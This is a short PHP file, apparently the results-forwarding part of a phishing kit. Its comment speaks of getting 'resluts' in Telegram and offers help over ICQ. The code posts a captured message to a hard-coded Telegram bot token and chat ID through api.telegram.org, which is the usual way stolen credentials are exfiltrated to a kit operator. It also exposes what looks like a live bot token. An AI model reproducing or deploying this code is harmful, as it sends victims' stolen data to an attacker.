<?php
/*
This is if you want resluts in your telegram.
Contact if you need help ICQ @labdata
*/
?>


<?php
$apiToken = "7430980133:AAHVRfHD96MpJa8PlwFAWk7-rUrZ1wZMrGE";      // Place your API Token between ""; //
$data = [
    'chat_id' => '7079429965',     // Place your chat ID between ''; //
    'text' => "$message"
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data));
